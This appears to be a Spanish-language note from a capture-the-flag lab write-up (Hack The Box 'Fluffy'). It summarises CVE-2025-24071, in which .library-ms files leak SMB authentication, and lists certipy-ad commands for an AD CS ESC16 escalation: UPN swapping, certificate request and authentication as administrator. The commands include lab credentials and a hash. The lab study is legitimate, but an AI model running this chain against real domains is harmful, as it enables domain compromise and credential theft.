[!INFO] CVE-2025-24071
El fallo está en cómo Windows Explorer procesa archivos .library-ms dentro de archivos comprimidos como ZIP o RAR
Cuando se extrae, si el .library-ms contiene una ruta SMB hacia un servidor atacante se intenta autenticar contra él

Escalada de Privilegios: AD CS ESC16

ESC16

Enumerar certificados vulnerables

certipy-ad find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.17.95 -vulnerable

1. Agregar a la víctima al UPN del Administrador

certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.129.17.95' -upn 'administrator' -user 'ca_svc' update

2. Solicitar certificado.pfx para la víctima con la plantilla por defecto User

certipy-ad req -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.129.17.95' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
# Obtenemos administrator.pfx

3. Revertir el UPN de la cuenta víctima

certipy-ad account  -u "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'ca_svc@fluffy.htb' update

4. Autenticarnos con administrator.pfx para obtener su hash

certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.17.95
